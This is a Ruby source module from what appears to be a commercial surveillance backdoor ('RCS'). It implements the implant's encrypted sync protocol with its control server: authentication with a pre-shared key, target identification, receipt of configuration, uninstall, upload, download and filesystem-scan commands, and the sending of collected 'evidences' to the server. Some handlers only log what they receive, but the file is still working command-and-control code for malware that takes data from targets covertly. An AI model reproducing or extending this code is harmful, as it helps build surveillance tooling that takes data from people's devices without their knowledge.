#
# Mix-in module for the protocol
#

# Relatives
require_relative 'config.rb'

# RCS::Common
require 'rcs-common/trace'
require 'rcs-common/crypt'
require 'rcs-common/pascalize'

# System
require 'ostruct'
require 'securerandom'
require 'digest/sha1'

module RCS
module Backdoor
  
module Command
  include Crypt
  include Tracer
  
  INVALID_COMMAND  = 0x00       # Don't use
  PROTO_OK         = 0x01       # OK
  PROTO_NO         = 0x02       # Nothing available
  PROTO_BYE        = 0x03       # The end of the protocol
  PROTO_CHALLENGE  = 0x04       # Authentication
  PROTO_ID         = 0x0f       # Identification of the target    
  PROTO_CONF       = 0x07       # New configuration
  PROTO_UNINSTALL  = 0x0a       # Uninstall command
  PROTO_DOWNLOAD   = 0x0c       # List of files to be downloaded
  PROTO_UPLOAD     = 0x0d       # A file to be saved
  PROTO_EVIDENCE   = 0x09       # Upload of a log
  PROTO_FILESYSTEM = 0x19       # List of paths to be scanned

  # the commands are depicted here: http://rcs-dev/trac/wiki/RCS_Sync_Proto_Rest

  # Authentication phase
  # ->  Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, SubType, sha1 ( BuildId, InstanceId, SubType, Cb ) )   
  # <-  [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]  |  SetCookie ( SessionCookie )  
  def authenticate(backdoor)
    trace :info, "AUTH"
     
    # first part of the session key, chosen by the client
    # it will be used to derive the session key later along with Ks (server chosen)
    # and the Cb (pre-shared conf key)
    kd = SecureRandom.random_bytes(16)
    trace :debug, "Auth -- Kd: " << kd.unpack('H*').to_s
    
    # the client NOnce that has to be returned by the server
    # this is used to authenticate the server 
    # returning it crypted with the session key it will confirm the 
    # authenticity of the server 
    nonce = SecureRandom.random_bytes(16)
    trace :debug, "Auth -- Nonce: " << nonce.unpack('H*').to_s
        
    # the id and the type are padded to 16 bytes
    rcs_id = backdoor.id.ljust(16, "\x00")
    rcs_type = backdoor.type.ljust(16, "\x00")
    
    # backdoor identification
    # the server will calculate the same sha digest and authenticate the backdoor
    # since the conf key is pre-shared
    sha = Digest::SHA1.digest(rcs_id + backdoor.instance + rcs_type + backdoor.conf_key)
    trace :debug, "Auth -- sha: " << sha.unpack('H*').to_s
    
    # prepare and encrypt the message
    message = kd + nonce + rcs_id + backdoor.instance + rcs_type + sha    
    #trace "Auth -- message: " << message.unpack('H*').to_s
    enc_msg = aes_encrypt(message, backdoor.signature)
    #trace "Auth -- signature: " << backdoor.signature.unpack('H*').to_s
    #trace "Auth -- enc_message: " << enc_msg.unpack('H*').to_s
    
    # send the message and receive the response from the server
    # the transport layer will take care of the underlying cookie
    resp = @transport.message enc_msg
    
    # sanity check
    raise "wrong auth response length" unless resp.length == 64
    
    # first 32 bytes are the Ks choosen by the server
    # decrypt it and store to create the session key along with Kd and Cb
    ks = resp.slice!(0..31)
    ks = aes_decrypt(ks, backdoor.signature)
    trace :debug, "Auth -- Ks: " << ks.unpack('H*').to_s
    
    # calculate the session key ->  K = sha1(Cb || Ks || Kd) 
    # we use a schema like PBKDF1
    # remember it for the entire session
    @session_key = Digest::SHA1.digest(backdoor.conf_key + ks + kd)
    trace :debug, "Auth -- K: " << @session_key.unpack('H*').to_s
    
    # second part of the server response contains the NOnce and the response
    tmp = aes_decrypt(resp, @session_key)
    
    # extract the NOnce and check if it is ok
    # this MUST be the same NOnce sent to the server, but since it is crypted
    # with the session key we know that the server knows Cb and thus is trusted
    rnonce = tmp.slice!(0..15)
    trace :debug, "Auth -- rnonce: " << rnonce.unpack('H*').to_s
    raise "Invalid NOnce" unless nonce == rnonce
    
    # extract the response
    response = tmp
    trace :debug, "Auth -- Response: " << response.unpack('H*').to_s
    
    # print the response
    trace :info, "Auth Response: OK" if response.unpack('i') == [PROTO_OK]
    if response.unpack('i') == [PROTO_UNINSTALL] then
      trace :info, "UNINSTALL received"
      raise "UNINSTALL"
    end
    if response.unpack('i') == [PROTO_NO] then
      trace :info, "NO received"
      raise "PROTO_NO: cannot continue"
    end
  end


  # ->  Crypt_K ( PROTO_ID  [Version, UserId, DeviceId, SourceId] )
  # <-  Crypt_K ( PROTO_OK, Time, Availables )
  def send_id(backdoor)
    trace :info, "ID"
     
    # the array of available commands from server
    available = []
    
    # prepare the command
    message = [PROTO_ID].pack('i')
    
    # prepare the message 
    message += [backdoor.version].pack('i')
    message += backdoor.userid.pascalize + backdoor.deviceid.pascalize + backdoor.sourceid.pascalize

    # send the message and receive the response from the server
    enc = aes_encrypt(message, @session_key)
    resp = @transport.message enc
    resp = aes_decrypt(resp, @session_key)
    #trace "ID -- response: " << resp.unpack('H*').to_s
    
    # parse the response
    command, tot, time, size, *list = resp.unpack('i2qi*')
    
    # fill the available array
    if command == PROTO_OK then
      trace :info, "ID Response: OK"
      now = Time.now
      now -= now.utc_offset 
      diff_time = now.to_i - time
      trace :debug, "ID -- Server Time : " + time.to_s
      trace :debug, "ID -- Local  Time : " + now.to_i.to_s + " diff [#{diff_time}]"
      if size != 0 then
        trace :debug, "ID -- available(#{size}): " + list.to_s
        available = list
      end
    else
      trace :info, "ID Response: " + command.to_s
      raise "invalid response"
    end
    
    return available
  end
  

  # Protocol Conf
  # ->  Crypt_K ( PROTO_CONF )
  # <-  Crypt_K ( PROTO_NO | PROTO_OK [ Conf ] )
  def receive_config(backdoor)
    trace :info, "CONFIG"
    resp = send_command(PROTO_CONF)

    # decode the response
    command, size = resp.unpack('i2')
    if command == PROTO_OK then
      trace :info, "CONFIG -- #{size} bytes"
      # configuration parser
      config = RCS::Config.new(backdoor, resp[8..-1])
      config.dump_to_file
    else
      trace :info, "CONFIG -- no new conf"  
    end
  end
  
  # Protocol Upload
  # ->  Crypt_K ( PROTO_UPLOAD )
  # <-  Crypt_K ( PROTO_NO | PROTO_OK [ left, filename, content ] )  
  def receive_uploads
    trace :info, "UPLOAD"
    resp = send_command(PROTO_UPLOAD)

    # decode the response
    command, tot, left, size = resp.unpack('i4')
    
    if command == PROTO_OK then
      filename = resp[12, resp.length].unpascalize
      bytes = resp[16 + size, resp.length].unpack('i')
      trace :info, "UPLOAD -- [#{filename}] #{bytes} bytes"
      
      # recurse the request if there are other files to request
      receive_uploads if left != 0
    else
      trace :info, "UPLOAD -- No uploads for me"
    end
  end
  
  
  # Protocol Download
  # ->  Crypt_K ( PROTO_DOWNLOAD )   
  # <-  Crypt_K ( PROTO_NO | PROTO_OK [ numElem, [file1, file2, ...]] )  
  def receive_downloads
    trace :info, "DOWNLOAD"
    resp = send_command(PROTO_DOWNLOAD)
    
    # decode the response
    command, tot, num = resp.unpack('i3')

    if command == PROTO_OK then
      trace :info, "DOWNLOAD : #{num} are available"
      list = resp.slice(12, resp.length)
      # print the list of downloads
      list.unpascalize_ary.each do |pattern|
        trace :info, "DOWNLOAD -- [#{pattern}]"
      end
    else
      trace :info, "DOWNLOAD -- No downloads for me"
    end
  end

  # Protocol Filesystem
  # ->  Crypt_K ( PROTO_FILESYSTEM )   
  # <-  Crypt_K ( PROTO_NO | PROTO_OK [ numElem,[ depth1, dir1, depth2, dir2, ... ]] )
  def receive_filesystems
    trace :info, "FILESYSTEM"
    resp = send_command(PROTO_FILESYSTEM)
    
    # decode the response
    command, tot, num = resp.unpack('i3')

    if command == PROTO_OK then
      trace :info, "FILESYSTEM : #{num} are available"
      list = resp.slice(12, resp.length)
      # print the list of downloads
      buffer = list
      begin
        depth, len = buffer.unpack('i2')
        # len of the current token
        len += 8
        # unpascalize the token
        str = buffer[4, buffer.length].unpascalize
        trace :info, "FILESYSTEM -- [#{depth}][#{str}]"
        # move the pointer after the token
        buffer = buffer.slice(len, list.length)
      end while buffer.length != 0
    else
      trace :info, "FILESYSTEM -- No filesystem for me"
    end
  end
  
  
  # Protocol Evidence
  # ->  Crypt_K ( PROTO_EVIDENCE [ size, content ] )
  # <-  Crypt_K ( PROTO_OK | PROTO_NO )   
  def send_evidences(evidences)

    return if evidences.empty?
    
    # take the first log
    evidence = evidences.shift
    
    # prepare the message
    message = [PROTO_EVIDENCE].pack('i') + [evidence.size].pack('i') + evidence.content
    
    enc_msg = aes_encrypt(message, @session_key)
    # send the message and receive the response
    resp = @transport.message enc_msg
    resp = aes_decrypt(resp, @session_key)
    
    if resp.unpack('i') == [PROTO_OK] then
      trace :info, "EVIDENCE -- [#{evidence.name}] #{evidence.size} bytes sent. #{evidences.size} left"
    else
      trace :info, "EVIDENCE -- problems from server"
    end
   
    # recurse for the next log to be sent
    send_evidences evidences unless evidences.empty?
  end
  
  
  # Protocol End
  # ->  Crypt_K ( PROTO_BYE )   
  # <-  Crypt_K ( PROTO_OK )  
  def bye
    trace :info, "BYE"
    resp = send_command(PROTO_BYE)
    
    trace :info, "BYE Response: OK" if resp.unpack('i') == [PROTO_OK]
  end
  
  # helper method
  def send_command(command)
    message = [command].pack('i')
    enc_msg = aes_encrypt(message, @session_key)
    # send the message and receive the response
    resp = @transport.message enc_msg
    return aes_decrypt(resp, @session_key)
  end
  
end

end # Backdoor::
end # RCS::
